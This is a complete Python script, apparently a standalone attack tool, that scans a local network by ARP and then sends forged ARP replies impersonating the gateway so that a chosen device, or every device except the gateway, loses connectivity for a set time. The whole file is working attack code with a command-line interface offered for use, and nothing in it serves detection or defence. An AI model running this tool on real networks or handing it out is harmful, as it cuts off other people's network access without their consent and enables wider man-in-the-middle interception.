#!/usr/bin/env python3
#Author: r0otk3r


import argparse
import os
import socket
import time
import netifaces
import ipaddress
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr
from typing import List, Tuple

# === Utility Functions ===
def require_root():
    if os.name != "nt" and os.geteuid() != 0:
        print("[!] Run this script as root.")
        exit(1)


def get_ip_range(interface: str) -> str:
    iface_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
    ip = iface_info['addr']
    netmask = iface_info['netmask']
    return str(ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False))


def get_gateway_ip() -> str:
    return netifaces.gateways()['default'][netifaces.AF_INET][0]


def get_mac(interface: str) -> str:
    return get_if_hwaddr(interface)


def resolve_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"


# === Core Functions ===
def scan_network(ip_range: str) -> List[Tuple[str, str]]:
    print(f"[*] Scanning {ip_range}...")
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    ans, _ = srp(req, timeout=2, verbose=False)
    return [(rcv.psrc, rcv.hwsrc) for _, rcv in ans]


def spoof(interface: str, target_ip: str, target_mac: str, gateway_ip: str):
    mac = get_mac(interface)
    pkt = Ether(src=mac, dst=target_mac) / ARP(
        hwsrc=mac, psrc=gateway_ip,
        hwdst=target_mac, pdst=target_ip,
        op=2
    )
    sendp(pkt, iface=interface, verbose=False)


def block_target(interface: str, target_ip: str, target_mac: str, gateway_ip: str, duration: int):
    print(f"[+] Blocking {target_ip} for {duration}s")
    for _ in range(duration):
        spoof(interface, target_ip, target_mac, gateway_ip)
        time.sleep(1)
    print(f"[+] Done blocking {target_ip}")


# === Main Entrypoint ===
def main():
    parser = argparse.ArgumentParser(description="ARP-based Network Blocker")
    parser.add_argument("-i", "--interface", help="Interface to use", required=True)
    parser.add_argument("-t", "--target", help="Target IP to block")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Duration to spoof in seconds")
    parser.add_argument("--list", action="store_true", help="List devices in network")
    parser.add_argument("--block-all", action="store_true", help="Block all devices (except gateway)")

    args = parser.parse_args()

    require_root()

    ip_range = get_ip_range(args.interface)
    gateway_ip = get_gateway_ip()
    devices = scan_network(ip_range)

    if args.list:
        print("\nDiscovered devices:")
        for ip, mac in devices:
            print(f"{ip:15} {mac}  {resolve_hostname(ip)}")
        return

    if args.block_all:
        for ip, mac in devices:
            if ip != gateway_ip:
                block_target(args.interface, ip, mac, gateway_ip, args.duration)
        return

    if args.target:
        for ip, mac in devices:
            if ip == args.target:
                block_target(args.interface, ip, mac, gateway_ip, args.duration)
                return
        print(f"[!] Target IP {args.target} not found on network.")
    else:
        print("[!] No target specified. Use --list to see devices or --block-all")


if __name__ == "__main__":
    main()
